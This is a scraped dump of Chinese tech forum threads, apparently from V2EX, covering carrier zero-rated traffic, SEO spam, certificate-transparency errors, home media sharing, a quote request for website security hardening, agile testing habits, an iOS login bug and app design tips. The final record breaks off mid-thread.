{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我想到的办法是应用在使用网络的时候统计自己消耗的流量，运营商在计算的时候减掉这部分。不知道是不是这样做的。</p>\n</div></div>"], "reply": "11", "tittle": "我比较好奇有些 APP 和运营商合作有定向流量。这个定向流量是怎么做到的？", "comment": ["访问地址都是定向的，对域名或 IP 进行定向不难吧。", "根据接口减免", "现在对常见应用的深度包检测都非常普遍了，更不用说根据 IP 地址和域名的检测。\r", "你看那些免的不都是拿域名和特殊端口做文章么。", "或者走 APN 控制也可以。", "IP 和域名减免", "在运营商接入网和计费系统上实现的， PCRF(Policy and Charging Rules Function)，配置 ip 或者域名", "不会 你觉得运营商会给应用这样大的权力？应用说多少就多少，那就太可怕了\r", "\r", "运营商（甚至包括 ISP ，各种网关）对流量的检测现在已经很成熟了，可以根据你的数据包检测出它来自什么（常见）应用，更何况目标域名 ip 端口都是可以直接协商确定的", "甚至有卖流量的呢", "有合作的运营商加个定向收费规则不难；\r", "没合作的就要配置个 vpn 服务器（比如蜻蜓 FM ）", "运营商是知道并记录 你 所有的流量去向的。", "这个不难吧， 一个是 HOST 还有就是 app 的 UA"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天随手谷歌了一下自己的网站名字”爱搜米“，结果居然搜出来这么一个网站： http://www.andso_cn.fujian11xuan5a7.loan ，而且这么个垃圾站居然还排在我前面。一来不得不佩服那些做 SEO 的，再一方面觉得吧，这种人真无聊。</p>\n</div></div>"], "reply": "16", "tittle": "我不明白这种网站到底算什么玩意儿？", "comment": ["seo 很多都是靠流量挣钱", "为了赚钱 什么事都做得出来", "反正我 google 出来第一个是 ", " 谷歌的排名变得很快", "玩 SEO 你能玩的过那些老站长嘛，人家一天都在搞这些", " \r", " \r", "深有同感，但这种网站根本不可能有流量，感觉唯一的用途就是把我的站点给搞臭了", " 那些人全是老司机，无所不用其极", "我也去搜了一下，然后感觉上当了……", "记得在你的网站上看了几集 <西部世界>\r", "当时搜影片不太好用还写了个爬虫弄了个影片列表", "那种网站一看就是程序自动生成的，描述文字都是直接爬过去的", " 采集站，统称垃圾站", " 哈哈，这么久了居然还有人记得，现在不做电影了，不过想看什么的话还是可以 @我，我给放暗链", " \r", " 我想投诉它", "少年太年轻", "我还真去谷歌了一下，目前排在第一啊", " \r", " 谷歌偶尔也会调皮一下"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近接触与学习到的几个思想，总结学习下。</p>\n<p>『黑天鹅』帮你认识世界的本质，『关键时刻』帮你认识商业的本质，张小龙则是从产品的本质出发来做工具的。</p>\n<p>『黑天鹅』这本书很出名，因为它创造了一个非常独特的视角：认真地看待随机事件，并且是可以采取策略来规避与利用的。</p>\n<p>世界一定程度上是由黑天鹅事件推动的。之所以黑天鹅事件往往被忽视，是因为其随机性、不可预测性，没有因素关系。而人的认识体系里，是追求因果关系的。</p>\n<p>结合「罗辑思维」有一期节目『有效行动的逻辑』，谈到这个世界演变的「黑天鹅」性质：</p>\n<ul>\n<li>人类的诞生与演变就是由不断的黑天鹅事件导致的。宇宙里产生地球这样一个适宜生命生存的环境是个意外，地球上生物的产生是个意外，人类从类人猿演变成智人是个意外。一系列的变异导致了人类是现在这个样子。这些都不是设计出来的。</li>\n<li>一个人一生的重大事件，也大多不是设计出来的，而是由随机事件导致的。\n我们对黑天鹅也不是完全没有掌控力的。我们可以让自己尽可能地接近正面黑天鹅事件，比如如果你想嫁给富二代，你可以采取的策略是：学历要高，要有一定的社交影响力。我们还应该尽可能避开负面黑天鹅事件，比如少在马路上走以避免可能发生的车祸，所谓常在河边走，哪能不湿鞋。</li>\n</ul>\n<p>『关键时刻』的意思是，做商业应该集中最核心的资源去关注与客户接触的「关键时刻」。对于航空公司与客户的接触关键时刻就是客户每次与航空公司工作人员接触的时间点，比如买票、飞机服务等。一个公司应该让「关键时刻」的人去发挥他们的主动能动性，让客户满意。海底捞也是非常好地把握住了关键时刻的，让与客户接触的服务员自己能够做决定免单、加菜等。在华为那里，这个叫「让听得见炮声的人来决策」。一个公司最怕的就是高层管理人员把握着决策权，而他们实际上并不接触客户。</p>\n<p>商业的本质是满足客户需求。满足客户需求的本质是，把握好每一个客户接触的「关键时刻」，提高客户满意度。</p>\n<p>张小龙少有地为了解释说明下他们新近推出的「小程序」而第二次上了微信公开课，也是苦口婆心地解释了他的产品理念，其实道出了「产品的本质」：好的工具，用完即走。</p>\n<p>之前腾讯联合创始人 Tony 在一次演讲时说到，微信的成功在于在产品上「克制」，少做。 Allen 毫不客气地反对了这个说法，他说他们没有克制，而是本来就没有欲望，所以无从克制。他的产品理念是，任何功能需要从「合理性」出发，推出来需要解决问题，而不去做把握不好的事情。</p>\n<p>张小龙还强调，微信就是一个「工具」，反驳了微信是个平台的惯常说法。「工具」就是要为人服务的，要帮助人来提高效率，所以应该是「用完即走」的。</p>\n<p>世界太复杂，社会太喧嚣，商业太残酷，所以我们大多时候受限于各种特别的视角、企图、欲望，而难以从「本质」去分析问题、解决问题。只有把握到本质，才能更清醒地去认识世界、做真正有意义的事情。</p>\n<hr>\n<blockquote>\n<p>作者： javenfang - 极光（ jpush 为极光团队账号）</p>\n</blockquote>\n<blockquote>\n<p>原文：<a href=\"http://www.jianshu.com/p/279f25a247d4\" rel=\"nofollow\">认识本质：黑天鹅、关键时刻与张小龙的产品观</a></p>\n</blockquote>\n<blockquote>\n<p>知乎专栏：<a href=\"https://zhuanlan.zhihu.com/jiguang-daily\" rel=\"nofollow\">极光日报</a></p>\n</blockquote>\n</div></div>"], "reply": "5", "tittle": "认识本质：黑天鹅、关键时刻与张小龙的产品观", "comment": ["你赢了，说什么都是对的。", "这好像就是现在说的鸡汤推论，因为你成功了，所以按照这个方式成功肯定是可以复制的。", "其实我一直很好奇，如果离开微信，他还能不能再成功一次\r", "btw ：我不认为 foxmail 是成功的", "最烦吹张小龙的。", "说了这么多，仔细一琢磨，跟啥也没说一样。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我打开 V2EX ， Chrome 提示信息如下：</p>\n<p>您的连接不是私密连接</p>\n<p>攻击者可能会试图从 <a href=\"http://v2ex.com\" rel=\"nofollow\">v2ex.com</a> 窃取您的信息（例如：密码、通讯内容或信用卡信息）。 NET::ERR_CERTIFICATE_TRANSPARENCY_REQUIRED</p>\n<p>该服务器提供了一个未通过证书透明度政策公开披露的证书。某些证书必须通过证书透明度政策进行公开披露，以确保它们值得信任且能保护用户免遭攻击。</p>\n<p>继续前往 <a href=\"http://v2ex.com\" rel=\"nofollow\">v2ex.com</a> （不安全）</p>\n<p>－－－－－－－－－－－－－－－－－－－－－－－－\n请问这个怎么破？</p>\n<p>PS：Chrome 版本 53.0.2785.101 (64-bit)</p>\n</div></div>"], "reply": "5", "tittle": "关于证书透明度的问题", "comment": ["chrome 某一版 bug ，更新 chrome", " 好吧，我用公司电脑打开没有问题，刚我在家用自己的电脑打开我的站点提示了这个错误信息，后来打开 V2EX 也是同样的情况，网上查了一下，说 Google 要求 2017 年所有的 SSL 证书需要通过证书透明度认证。", "月经贴", "月经贴，升级 Chrome 到最新版。\r", "\r", "Google 把透明度信息硬编码到 Chrome 里，所有透明度信息有效性只有 3 个月， 3 个月后默认全失效，升级到最新版程序才能更新这个。", " \r", " get it, thanks guys"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>没必要搞个 NAS 吧？</p>\n</div></div>"], "reply": "57", "tittle": "家里想要手机看电脑上电影是不是只要开启 SMB 共享就行？", "comment": ["是的。 NAS 的意义在于 24h 在线 & 大硬盘。", "你家局域网无线要够，像我那的那个 进个卫生间隔堵墙， 720 都看不了了", "搭车问一下，要用什么软件看？", "我的是 win 开共享，然后 iso 上 nplayer 直接看", "win 下共享，另外设个带密码的账号。\r", "手机浏览器用 x-plorer ，播放器用 mxplayer", "在家里，当然是怎么舒服怎么看，比如电影我就是用电视配合家庭影院看的。", "dlna 简单一点，更适合多媒体； SMB 比较通用，什么文件都可以共享", "明白了，感谢各位", "50 块钱智能路由器插个硬盘解决。", "对的，是可以的。", "感觉 samba 传输速度不如 ftp 快，我连家里 NAS 都是用 ftp", "我都是下载 mp4 的视频直接用 HTTP 看", "你想想你开着电脑的功耗和 NAS 的功耗 另外能 NFS 和 HTTP 流的话尽量别用 SMB", "dlna 没法加字幕", "可以刷 Openwrt 带 usb 接口的路由器可以完美解决你的问题 并且可以装上 aria2 远程下载", " NFS 比 SMB 有什么优势吗？谢谢。", "如果只有这个需求，你甚至可以直接开 apache ，把目录开放出来就行", " 关键是如果用 NFS 或者 HTTP 流，不知道有什么软件支持，我想把看电影的服务装在虚拟机里", "楼主，你那个其实就是 NAS🙃", " @", "  ,可否推荐一下智能路由？一直开电脑也不爽。", "DLNA 吧， SMB 还有个管理安全性的问题。有些手机播放器 DLNA 的视频也可以外挂字幕的。", " #16 就我自己体验而言 速度是一个很大的区别 NFS 比 SMB 快很多\r", "\r", " #18 NFS 不好说 HTTP 的话 随便一个支持流媒体播放的都能吧 如果说的是服务端 HTTP 直接 Nginx 啊", "mxplayer+hfs 不是更省事。", "nfs 协议最好， smb 效率低", " 有软件么？装什么软件能开启这个协议？", "我是远程桌面 直接看的....", "easysshfs\r", "不过没改好权限", " 同，我用 teamviewer", "大 sd 卡，手机下载", "迅雷的路由宝其实也很省心的。也不贵。", " 小米啊或者斐讯啊，交易区二手的 50 块钱。", " \r", "usb2.0 的话 newifi mini 刷老毛子，闲鱼在 100 以内，以前活动新的 69\r", "usb3.0 的话上华硕，型号看你预算\r", "sata 的话基本都是个人开发板多，或者上软路由", "DLNA 最好， Linux 装个 miniDLNA, Windows 在控制面板网络和共享中心打开媒体流就行", "DLNA 或者 WebDAV 手机用 nplayer 完美", "几乎没有比 Nginx 更快的了， Nginx 开 autoindex 就能用，而且比 smb 或者 FTP 更通用", "路由上搭建了 SMB ，手机上从来没见过成跑过 6M/S 的（ 5G ， 433M 带宽），然而随便一个破电脑都能跑到 30M ，后来在路由上搭建了 WEBDAV 手机就跑到了 25M ，结论： SMB 在手机上真心没法用。。。", " 路由瓶颈， newifi mini 换成 ac18  效果很明显", " 可是 pc 能跑到 30+说明不是路由的问题吧", "暂时 windows ，开 hfs 来挂 http 流看的", " 具体服务器是啥？", "楼主你需要专业的 nas 设备，很省心的。", " #20 我自己使用的是小米路由器 mini,刷了 Padavan 固件，这个固件有多种共享协议。写入速度的话有 12.8m/s,手机播放视频的话 Solid Explorer 2 + MX Player 并且可以外挂字幕。路由器的话推荐 newifi mini 价格 129 ，配置跟小米路由器 mini 一样。也是可以刷 Padavan 固件。附上一份 Padavan 固件支持。。。。。\r", " \r", " \r", " \r", " ", "100 左右买个迅雷下载宝。再接个 USB3.0 的移动硬盘", "windows 上的话 dlna 不是更方便吗", " 一直说斐讯官方固件有后门，这种个人开发者的不开源的固件就没有隐患吗？", " 这是开源的 不放心可以自己编译", "web", " 只有老毛子自己那个才在 bitbucket 上开源吧，那个并没有适配斐讯。恩山上的那个不是开源的。", "一直用 vlc ，自带本地网络视频选项。 pc 和 linux 也都是用这个。当然一般都是在 pc 和 linux 上把路由器的盘挂在文件浏览器上", "实测 dlna 速度够快够省心， 1080p 拖动进度条基本秒定位，刷的是 padavan 。\r", "\r", " \r", "想请问 webdav 要如何布置在路由上？什么固件？", "其实我就一直在用 webdav ，直接用浏览器就能打开，什么应用都不用装（服务端是 python ， wsgidav ）", "对于 win 安卓用 es 文件浏览器  对于 osx 安卓用 VLC", " nginx 就可以，但是要安装 webdav module", " 我 R6300V2 tomato 固件， opkg 装的 nginx-full", "说一下楼上那些推荐廉价路由的，廉价路由的性能很低，用来跑下载效率非常低，只够挂个硬盘看硬盘里的东西(我用 newifi mini 挂硬盘无线能跑到 25M/s ，下载到了 2 、 3m 的时候负载已经飞起来卡的无线都不好用了)", " 请问有什么好一点的路由推荐么？适用于带宽一百兆的，最好好刷 openwrt ，潘多拉之类的，谢谢", " 就叫“ hfs ”"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在有个需要用户登录并输入个人信息的网站，需要做安全强化：</p>\n<p>登陆页面 http 变成 https (我们负责申请 certs)\n登陆页面预防 SQL Inject\n密码从明文保存改为 hash 保存</p>\n<p>以及其他有必要的安全措施。</p>\n<p>话说这里有人愿意 /有能力接这个活吗？</p>\n</div></div>"], "reply": "45", "tittle": "找人做个这个活要多少钱？", "comment": ["给个联系方式吧", "这个真没什么复杂的", "请联系我", "敢不敢先把网址或者功能截图发一下\r", "感觉就是 1000 元钱的事儿", "并不复杂，为嘛不自己做？\r", "另外 hash 算法太弱。加盐，确保一样的明文得不到同样的秘闻。", "这也叫活？", "请联系我", "laravel 里面有这个功能，移过去改动一下接口", " 这需要 1000 么 感觉 100 都有人做", "加上个人信息 简单，改成 https 简单，安全防护最难，一个 sql 注入只是安全防护的一种，还有很多需要做的。", "楼主上面提到的给 1000 可以了，“其他”要 10w 。\r", "/手动滑稽", "以及其他有必要的安全措施。\r", "\r", "看到这句话，就不想接了。\r", "\r", "等下拿了可怜的几百块，才过没两天就又找我说这里应该还需要防护下，那里再防护下。\r", "\r", "感觉会无止境啊", "SQL INJECTION 我感觉这个可多可少。报价慎重。", "上一台 waf ，日志审计做起来， 10w 可以", "以及其他有必要的安全措施，嘿嘿\r", "而且原有用户已保存的密码还要处理", "其他这个很微妙啊", "除了那个其它，确实 100 就够了", "多少钱的都有", "馬上会有除了其他 50 够了的么？", "看成找个活人。 z   z", "没做过但想学，免费帮你做可以不", "以及其他有必要的安全措施（手动滑稽", "没人觉得这是个坑吗？\r", "增加 sql 注入防护+明文保存密码，意味着代码质量非常糟糕，下面还跟了个“以及其他有必要的安全措施”。", "楼主看了 reddit 那帖子害怕了把😁", "http => https 不就是配置一下服务器。 密码 从明文到 hash 不就是改登录注册这一块的功能么，就写一个密码的 hash 方法，登录注册时调用一下这方法就可以了。还有就是把现在的密码都调用 hash 方法更新更新进去就可以了。", " 是的，而且接手了个烂摊子\r", "\r", "\r", " 代码质量非常糟糕+落后，所以可能需要重头写起！", " 基本上我们那个网站就处于 reddit 那个帖子里的网站的状态(可能还不如，还跑在 windows server 2003 上呢。。。。)我们是非营利机构，没有专职 IT 和 developer ，现在的系统是个实习生 7 年前写的", " #27 7 年前的实习生 ", " ", "建议楼主把“以及其他有必要的安全措施。”写清楚\r", "\r", "除了这句话，其他的 CNY100 ，你能找到一大把人可以做，但是这个“其他”，你什么都没说，完全没办法明码标价，如果非得这么笼统的话，请参考一个 7*24 安全运维团队的工资……", "大概三个吧\r", "1.SSL\r", "2.SQL Inject \r", "3.密码加盐 SHA256\r", "\r", "1 、 3 你们说 CNY100 我我信， SQL INJECT 搞不好就是重构整个项目，谁来帮我做下？", "去年有个我半路接手的客户,做的是商城,蛮大的,月流水在 200-300W\r", "从来没在意过安全这方面,直到某一天被个小娃娃日了,因商城有用佣金模式所以有无须审核的自动打款相关的东西\r", "半小时被搞出去 18W\r", "\r", "当时那家开发公司收了他们 60w 的开发费用,我们接手后分析了下代码,简直惨不忍睹\r", "前端各种洞,明文传递系统敏感数据,交易流程各种前端判定,简直了......\r", "\r", "有必要的安全措施,真的有可能是很大一工作", " '我们外包是这样的，拿钱就跑哪管身后滔天火海'\r", "\r", "这里看来是被抓了？", "说 100 能做的，恐怕没考虑 SQL Inject 这点会有多坑", "其他是啥？？", "10 块成交 不能再少了", "这可不好说，这种修改很大程度看原来的写得怎么样? 如果是那种藕合非常高的，拆东墙补西墙，又留下一堆新的 bug", "1000 吧，但是我估计 100 也有人接，做不做得好就另说了", "需要渗透测试可以找我", "程序员也不要恶意破坏市场么， 100 块是在搞笑么？\r", "\r", "包括沟通，改代码，联调测试，上线部署。处理一些杂七杂八的事情，怎么也得 2-3 个小时吧。\r", "\r", "外包时薪怎么也得三四百起吧，恶意破坏市场的后果就是外包沦为苦力", "Google Forms 免费，好像完全符合楼主需求啊", "说 100 的，你们的时间我感觉真的不值钱啊 ", " ", "别抢别抢， 10 块钱全包了，速速联系我", "1 ， 3 大概 2 个小时，算时薪 600 ，，价格 x2 。但是 2 就说不好了，至于其他，就要另外加钱了。", "密码从明文改为 hash ，觉得碉堡了，哪年的程序了，还明文", "安全是个大命题了， YAHOO 这么强的公司还时不时被黑呢。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在小团队中比较依赖敏捷开发，功能测试大部分都是由开发工程师自己来测试……</p>\n<p>but 很多开发工程师（程序猿）都是固执或偏执狂：），都很相信自己的代码质量！！</p>\n<p>想让他们自己测试自己所做的功能，基本都是随便点击两下就说 OK 。然后上线的时候出现问题，我相信很多人都有过这样都经历……</p>\n<p>Q1 ：请问开发工程师（程序猿）如何养成自己测试自己的代码习惯？</p>\n<p>Q2 ：请问敏捷开发中如何把控测试环节？</p>\n</div></div>"], "reply": "27", "tittle": "敏捷开发中，如何让程序猿养成自测（自己先测试）习惯？", "comment": ["敏捷开发不推一波 TDD 吗", "交换测试", "成立测试部门，只占女的，测试这种东西需要耐心和细心，所以找女的，然后又可以解决程序员的单身问题，让团队更加稳定。下一题。", " 好办法，男女搭配干活不累", "楼上+1", "任何规则不做成自动化都是鬼扯。\r", "\r", "CI 加规则，没有单元测试不给过。\r", "\r", "上线前填 Check List ，不测上线出问题负责，影响绩效。", " +1", "得有自动化测试,提交前自动做 sanity(unit-test),提交后再做 function-test", "TDD+自动化 CI 是正解", "很简单呀，给程序员更多的时间", "敏捷开发不就是快速压缩工时嘛，又想速度快，又想质量好~ 花钱请大牛啊", "多于多少的 Bug 数就要记绩效。", " 这个赞同，可以设置 Coverage 阈值。", "没有测试代码和 CI 保证持续集成的敏捷不叫敏捷－ － bb", "TDD\r", "\r", "其实从这个话题中 我想说 挺喜欢 pair", "使用专门的测试人员, 并且引入测试结果 奖励 /惩罚机制. 一旦有了奖罚制度, 自然就会对代码质量认真对待. 从而避免一些不应该产生的 bug.  \r", "之前有个一个同事, 每次都是''早早''完成任务,但是问题一大堆(他自己知道). 因为没有关于质量的奖励 /惩罚机制 测试人员对于他确实已经无奈了. 不能让认真干活的人不落好. 才能提高质量.", "时间要管够", "需求不能一天变一下，不能随时加需求", "那我搭楼问一下学测试怎么学呢", "多发一份测试岗位的工资。", "CI\r", "Code Review 都是不错的辅助手段\r", "\r", "不过前提是工期够，需求基本稳定不会出现一天变三回的情况", "只雇佣有责任心的程序员。\r", "什么 TDD 、 CI 都不能保证杜绝这个问题。测试覆盖率 100%，但就是不工作的代码多了去了。", "26 楼 +1", "TDD 的神话，的理想，的苟且以及诗和远方\r", "\r", "\r", "巴别塔：开发环境演进史\r", "\r", "\r", "客观上来说开发环境有问题，缺少东西代码跑不起来，单元测试靠手写 mock 很难推行。主观上来说，大家都只对生产环境的集成负责，而不对线下环境的集成负责。", "我们当时做一个敏捷开发项目的时候采取的 bugreport 来评价 kpi 的。当然，这只是手段，不是目的，只是为了让写出 bug 更少的代码，我觉得上面那个成立专门的测试团队也可以，但是貌似是不符合敏捷的理念了，所以我觉得交换测试那个不错。", "减少需求 2333", "多给钱 然后不测就开除，不加钱 又要让人多做事，呵呵"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近云音乐, 每次打开都要登陆, 我以为是升级了的 BUG, 后来, 发现淘宝也有这个问题.\n研究了半天没有发现原因.\n但是扣扣, 微信, 没有这个问题.\n系统 iOS, 64G, 空间还有 16G Available.\n有人有同样的问题么?</p>\n</div></div>"], "reply": "23", "tittle": "最近手机 APP 都保存不了登陆状态了[iOS]", "comment": ["测试了下 iphone7 和 6s 还有 6 都没问题", "有，很诡异的问题，目前我知道包括楼主，我在内有四个人遇到这种情况，现象就是打开某些 App （特别是网易云音乐， Whatsapp ）出现账户自动登出，登录后强制退出再打开还是登出，重启手机再登录大部分情况下能好（也不是完全，比较玄学）- -！这锅应该是苹果的啊", "遇到过，也是部分 app 会出现。\r", "重启就好了。", "android 也遇到过，好几个 app 每次打开都要重新登录。", "有。。。我还以为是软件开发者的问题", "有，重启过后又好了。", "10.3 ？", "我也遇到过，后面就去升级 iOS 系统了", "NSUSERDEFAULTS BUG", "这届 iOS 系统很差劲就是了，都是几率性问题，闹钟不响，来电不响，视频无法播放，登录信息丢失，都是重启后又消失。", "我也遇到了 7p , 几个软件老是让重复登录 或者表现出第一次打开的样子...", "iPhone 6s 遇到过很多次,现在好像又消失了。 之前是网易云音乐和钉钉经常无法保存登录状态，百思不得其解...", " \r", " \r", " \r", " \r", " \r", " \r", " \r", " \r", " \r", "重启一下机器貌似好了, 手机有几个月没有重启了.\r", "版本: 10.2.1, 感觉应该是这个版本的问题, \r", "以前都没有遇到过", " 很久之前就有了", " 我遇到的是微信来了，不响几分钟之后可能才会有提示。网络应该是没有问题的。", "我的 iPhone 6 系统 10.1.1 也有这个问题，网易云和淘宝每次打开都要登录，也是重启一下就好了", "据说是 NSUserDefault 的 Bug", " #17 把登录信息放 NSUserDefault 里？\r", "keychain !", " 结合使用吧，状态存 NSUserDefaults ，信息存 Keychain （我猜", "终于找到一样的了。。。我之前也是，小部分 APP 登陆之后再次打开丢失登陆状态（甚至连欢迎动画都跑出来了），淘宝，小米等都是这样，怎么搞都不行，重启过后现象好转，目前已经稳定了有段时间了。（ 10.2.1 ）", " \r", " \r", "\r", "明确跟你们说。。不是 10.2 才有的， 10.1 的时候我也经常遇到 💊", "前几天遇到过 APP 是百度地图", "遇到过类似的问题，是因为那里的 wifi 有问题会识别为 wap 。你可以看看手机网络有没有类似的设置。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>作为一个没有什么审美观的程序猿,如何做出看上去还凑合的 APP..</p>\n<p>脑壳很疼...</p>\n</div></div>"], "reply": "30", "tittle": "作为一个没有什么审美观的程序猿,如何做出看上去还凑合的 APP..", "comment": ["好好遵循各个平台设计原则就不会太差...", "不要为了考虑美观问题，而去做额外的设计。美观不是目的，好用才是。\r", "上世纪（ 1999 年），微软出过一本《 windows user experience 》，推荐一看（中文译名叫 windows 用户经验，译者该枪毙）\r", "2009 年有一本《瞬间之美》（ Robert Hoekman, Jr. ）也推荐一看（又一个译者该枪毙的典型）\r", "\r", "说一下为什么推荐的都是老书\r", "1 、抛弃花哨的东西，回归到古朴一点的时代，这两本书都是从如何进行设计并不断改良的角度来审视用户界面设计的。尤其是后则。\r", "2 、这两本东西都很薄，很好读，但是含金量并不低\r", "3 、以上都是我瞎说的，因为近十年我没买过类似的书了", "我大概是这样做的：\r", "先罗列你应用的大概功能点，然后用草图画出来，可以不用很精确，大致位置 /交互确定就行；\r", "然后我会用 Sketch 来把草稿用标准控件大体实现我所需要的功能点；\r", "接着参考一些主流的应用设计（ dribbble/behance ），来改进第一版的设计图；\r", "最后确定功能之间的交互以及评估代码实现的难度；\r", "最后就是 \r", "\r", "写代码！", " 并没有瞎说啊，因为确实有这两本书。谢谢推荐我立马就买了一本《瞬间之美》", " 那本书的译者很蛋疼。\r", "作者在正文里明确说明了，他不会在（纸张）书里贴写网址，这种事情很不优雅，对用户没什么卵用。但是译者很执着，在正文的每一个网站后面标着“ XXX ，一个 XXX 类型网站，网址为 XXXXX ，译者注”这种看起来像是打作者脸的东西。", "用 material design 我开发 android app 时候就是用 material design 还喜欢抄袭知乎的界面", "抄别人的设计", "感觉星巴克的 App 让人看起来就很舒服\r", "\r", "另外去看看 Android 和 iOS 的官方指南吧", "贴一份 iOS 10 界面设计导读\r", "\r", "找一个同类型中你觉得设计得不错的 app ，看别人是怎么布局，图标 banner 啥的不要自己画，去图标库图片库找现成的。", "一开始必须去模仿其他优秀 app 的界面，你会有很大的提升。后面去补 ui 设计的理论，然后你就可以当产品经理了", "使用 CLI 不要使用 GUI ，一般差不到哪里去", " 楼主问的是~~~App ！ CLI 这么销魂，画面太美我不敢看怎么办！", " 没人规定 App 不能用 CLI 喂", " 我又没说不能用，就是用起来，打字太销魂了...", " 你看其实很多聊天软件完全可以做 CLI 界面的嘛，表情包什么的都替换成颜文字。", "楼上都什么鬼 当然是找个做设计的女朋友啦", "和题主有同样的烦恼。不过现在都尽量用官方原生控件，风格统一，效果也挺棒的。", "简单点 设计的方式简单点……\r", "\r", "感觉只要图片分辨率到位，图标字体大小得体，配色清新点，一般都不会很难看应该……", " 谢谢..学习了", "作为一个浑身上下只有 5 个艺术细胞的死程序员，我用我的亲身经历告诉你：\r", "一切设计知识学习、设计框架套用、设计范例抄袭，都是无用功，做出来都是屎。都是屎。都是屎。不要羞于炫耀自己强大的理性，也不要怯于承认自己艺术方面跟阿米巴虫一样的原始低能。\r", "\r", "逻辑派能做的：\r", "用理性和逻辑来选择合适的控件。\r", "用理性和逻辑来确定合理的布局。\r", "用理性和逻辑来设计人性的交互。\r", "这些都属于用户体验、交互设计的范畴，都是用理性可分析可归纳可入门的，可以从#2 @", " 推荐的书之类资料里习得，多看几篇网文多分析几个 app 也可以增进功力。一句话：懂得用理性来分析人性，你就可以入门。\r", "\r", "至于设计，审美，艺术性，见鬼去吧。\r", "把剩余的精力都花在 #17 @", " 这种方案上才是真·人生指南。", "看文档， iOS Design 或者 Material Design(Lite)", " 学设计难道就不是学你上面说的东西吗 你把设计归纳了一下然后说这不是设计 不明白你受啥刺激了啊 兄弟", "不过国内是不是没有正常教设计的学校", "建议使用 material design 。规范里面把很多间距啊、字体大小啊、颜色啊都规定好了，选着用就行。", "作为前端而非 APP 开发，我表示,直接用别人成套的轮子 /组件(如果有)就可以了。。。", "material design 看着就挺舒服的~", "先做功能，再丑也不要紧，只要功能可以解决需求，有用户才有优化的动力。\r", "第一版尽可能用原生的框架 UI 的组件，不要怕丑，因为框架自带的组件再简陋也是风格一致的设计，在没有审美的情况下，自己选各种组件去拼接出来界面的会更丑。\r", "也不要想着用业界比较酷炫的 UI 库，你会发现虽然官方 UI 丑，但是文档齐全出错好找解决方案，各种 UI 库哪怕是大厂出的，在对 APP 系统接口不够了解的情况下使用等于在同时学两套接口，出错查起来会有无从下手的感觉。\r", "\r", "交互是个大坑，尽可能按官方的交互手册来，而且要保持一致性，不要出现一个操作模式在不同地方有不一致的响应，不要拍脑门想快捷操作，因为程序员的思路和普通用户真的不一样，比如用户习惯了左右滑动代表拖动列表数据的话，就不要在某些地方出现左右滑动操作前进后退的事情了，反之亦然。\r", "iOS 的用户被系统教育了长按的操作习惯， Android 用户习惯这个操作的很少很少，如果是 Android 藏在长按触发的功能可能不会被用户发现。\r", "类似的还有双击触发、多点触摸拖动这类看起来便捷的技巧，不写清楚引导的话，有可能用户完全发现不了，虽然写了用户也不一定会记得住，所以是不是要用这种高级技巧看有没有时间写代码吧。\r", "\r", "\"标签列表\"->\"详细介绍\"->\"另一个标签列表\"->\"另一个详细介绍\" ->\"又一个标签列表\"。这里有个坑，如果没有复用组件的机制，反复点下去，会出现一个很长的调用栈，用户可能会返回到吐血。如果复用了又可能不符合用户的预期，比如超长的列表被重载了丢失操作历史。这个最好先想好用户可能更习惯那种交互。\r", "\r", "APP 的缓存和存储是个巨坑， iOS 有系统约束的清除规则， Android 有神奇的 SD 卡读写权限约束。\r", "iOS 还好只要读一个发行版的规范就好，读完手册不要犯该持久化的文件存在缓存被系统删掉的错误。\r", "Android 各家修改的 rom 权限略有微调，还没有文档，只能靠猜，如果是 Android 的话最好找个有经验的帮忙，至少碰到问题可以问个方向。\r", "\r", "iOS 虽然官方框架限制很多，但是真心对独立开发者友好，用户升级积极性高，几乎都是新版本系统，只要按着官方文档用官方的原生框架就能做出来一个还过得去的 APP 出来。 Android 有些机型真的很坑，不要想着兼容大多数主流版本，个人开发的话，能做到 4.0 正常， 5.0 、 6.0 不因为神奇的权限问题闪退就不错了。\r", "决定自己开发很有趣，我踩过的坑就这些印象比较深刻的，希望能对楼主有帮助。", "看看 dribbble ， ui 中国提高审美。用现成的 ui 框架。 ps 估计你没时间学，亲手做张图才知道怎样才好看。", " 赞", "看哪个 app 的效果好，就抄过来"]},
{"content": ["<div class=\"topic_content\">有几个 qq 群，突然发现有些二三线城市也在招开发工程师，而且职位需求看起来也挺正规。\r<br>\r<br>所以想问问大家有了解的么？它们到底怎么活下来的呢？ 网站建设？\r<br>\r<br>还是说有些从事互联网黑色的业务，刷流量什么的？</div>"], "reply": "25", "tittle": "二三线的网络科技公司的主营业务是什么？", "comment": ["外包，黑产。", "二三线城市被黑的最惨的一次。", "外包", "天津杭州算二线，郑州等省会算三线。这些城市为啥不能有网络科技公司？", "一样的啊。为什么二三线城市的网络公司就不能做正规业务了？所谓网络公司，大多都是线上的业务，和地区没多大关系。现在很多网络公司为了节约成本，把办公地点设在二三线城市。", "杭州，成都，西安... 哭了", "互联网时代，一线城市能做的二线城市不能做吗？", " 我反而感觉互联网时代以后,资源比起以前更趋向集中了.另外分工也更明细化了,要干成一件事,需要周边合作以及从周围汇总的资源也比以前更多了.以前可能还有闭门造车,不鸣则已,一鸣惊人的事,现在越来越难了.", "难道只有北京人吃外卖吗？", "我举个例子   我老家村子  离镇上有十多分钟路程  百度美团饿了么什么的根本没有  但是有个外卖叫脚集外卖    可以把镇上的外卖送到村子里  相当好用   所以这个例子就是说   大公司不愿意去扩张的市场  总有小公司会去做    乡下也是有点外卖的需求的    而且小公司的业务可能和大公司的根本没有区别 不过技术上差距肯定是有的", " 招不到人咋做\r", "天天美剧，估计不少人用过吧，这个在郑州，他们现在转型开发美剧相关的公众号和 app 了\r", "驱动之家， 也在郑州\r", "\r", "李总去过好多次成都，似乎那边搞游戏的团队不少\r", "\r", "我觉得网络科技是二三线城市在科技产业里最容易追赶的产业了。", "各类本地政府企事业单位的信息化建设，卖硬件、机房建设、维护接盘等", "二三线城市被黑的最惨其中一次。", "美图秀秀：厦门\r", "猪八戒: 